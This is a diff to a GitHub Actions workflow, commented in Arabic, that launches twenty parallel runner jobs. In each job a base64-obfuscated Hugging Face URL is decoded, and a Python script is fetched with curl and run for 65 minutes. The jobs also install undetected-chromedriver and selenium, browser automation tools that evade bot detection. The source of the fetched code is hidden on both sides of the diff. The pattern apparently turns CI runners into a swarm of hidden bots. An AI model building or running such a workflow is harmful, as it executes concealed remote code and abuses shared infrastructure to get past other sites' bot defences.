@@ -1,12 +1,11 @@
-name: Linux On-Demand Task Swarm
+name: Linux Cohesive Task Assembly
 
 on:
-  # استقبال أمر تشغيل خارجي عبر التوكن بكلمة التشغيل: start
-  repository_dispatch:
-    types: [start]
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
 
 concurrency:
-  group: ondemand-swarm-${{ github.workflow }}-${{ github.ref }}
+  group: cohesive-assembly-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,92 +14,94 @@ permissions:
 
 jobs:
   # =================================================================
-  # 【1】المشرف الزمني: يُنهي الـ workflow بالكامل بعد 65 دقيقة
+  # ناظر الإبادة الكاملة: يُنهي الـ workflow بأكمله عند حد 65 دقيقة
   # =================================================================
-  temporal-overseer:
-    name: "Temporal Overseer"
+  annihilation-overseer:
+    name: "Annihilation Overseer"
     runs-on: ubuntu-latest
     timeout-minutes: 70
     steps:
-      - name: Enforce 65-Minute Termination
+      - name: Trigger Total Annihilation Sequence
         run: |
-          echo "[OVERSEER] المشرف الزمني نشط. سيتم إلغاء كل شيء بعد 65 دقيقة."
-          echo "[OVERSEER] معرف التشغيل: ${{ github.run_id }}"
-
-          # الانتظار لمدة 65 دقيقة كاملة (3900 ثانية)
+          echo "[OVERSEER] Annihilation overseer on post. Total eradication armed at the 65-minute boundary."
+          echo "[OVERSEER] Reading workflow stamp: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
           sleep 3900
-
-          echo "[OVERSEER] انقضت الـ 65 دقيقة! جاري إصدار أمر الإلغاء الشامل..."
-
-          # إرسال أمر الإلغاء لجميع مهام الـ workflow
+          
+          echo "[OVERSEER] Boundary crossed! Triggering total annihilation sequence..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
-
-          echo "[OVERSEER] تم إرسال أمر الإلغاء بنجاح. إنهاء كل المهام المعلقة."
+          
+          echo "[OVERSEER] Annihilation sequence triggered. All running and scheduled units will be eradicated."
 
   # =================================================================
-  # 【2】المهمة الرئيسية: تشغيل الوحدات العشرين
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات التجمع
   # =================================================================
-  deploy-swarm:
-    name: "SwarmUnit-${{ matrix.unit_slot }}"
+  convene-assembly:
+    name: "AssemblyUnit-${{ matrix.unit_serial }}"
     runs-on: ubuntu-latest
     timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_serial: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      # 〈١〉 تجهيز البنية التحتية
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      - name: Provision Base Layer
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الأول: إعداد القاعدة الأولية
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Configure Primary Foundation
         run: |
-          echo "[BASE] تجهيز SwarmUnit-${{ matrix.unit_slot }} على Linux..."
+          echo "[PRIMARY] Configuring primary foundation for AssemblyUnit-${{ matrix.unit_serial }} on Linux..."
           sudo apt update -qq
           sudo apt install -y curl python3-pip
 
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      # 〈٢〉 استدعاء ملف المهمة الرئيسي
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      - name: Retrieve Task Payload
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الثاني: انتزاع الملف التنفيذي
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Extract Execution File
         run: |
-          echo "[RETRIEVE] جلب app_task.py من المصدر المشفر..."
-          SOURCE_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$SOURCE_LINK" -o app_task.py
-          echo "[RETRIEVE] تم حفظ الملف بنجاح."
+          echo "[EXTRACT] Extracting app_task.py from assigned source vault..."
+          SOURCE_VAULT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SOURCE_VAULT" -o app_task.py
+          echo "[EXTRACT] Execution file extracted successfully."
 
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      # 〈٣〉 تثبيت حزم بايثون
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      - name: Install Python Modules
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الثالث: تجميع الحزم الأساسية
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Aggregate Essential Packages
         run: |
-          echo "[MODULES] تثبيت مكتبات بايثون..."
+          echo "[AGGREGATE] Aggregating essential packages..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      # 〈٤〉 التشغيل مع مراقبة داخلية حتى 65 دقيقة
-      # ✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺
-      - name: Launch Task Under Time Marshal
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # ⟢ المقطع الرابع: التنفيذ المُقيَّد بالمدة (65 دقيقة)
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Perform Duration-Locked Run
         run: |
-          echo ">> إطلاق المهمة على SwarmUnit-${{ matrix.unit_slot }}..."
-
+          echo ">> Convening AssemblyUnit-${{ matrix.unit_serial }} operation..."
+          
+          # إطلاق العملية في الخلفية
           python3 app_task.py &
-          SWARM_PID=$!
-
-          echo ">> الحارس الزمني نشط. الحد الأقصى: 65 دقيقة (3900 ثانية)."
-
-          # الانتظار 65 دقيقة كاملة
+          ASSEMBLY_PID=$!
+          
+          echo ">> Duration lock engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
           sleep 3900
-
-          if kill -0 $SWARM_PID 2>/dev/null; then
-            echo ">> انقضت المهلة! جاري إيقاف المهمة..."
-            kill -9 $SWARM_PID
-            echo ">> تم إيقاف المهمة بقوة."
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $ASSEMBLY_PID 2>/dev/null; then
+            echo ">> Duration lock expired! Retiring operation..."
+            kill -9 $ASSEMBLY_PID
+            echo ">> Operation retired by lock enforcer."
           else
-            echo ">> انتهت المهمة داخل المهلة المحددة."
+            echo ">> Operation closed within duration lock."
           fi
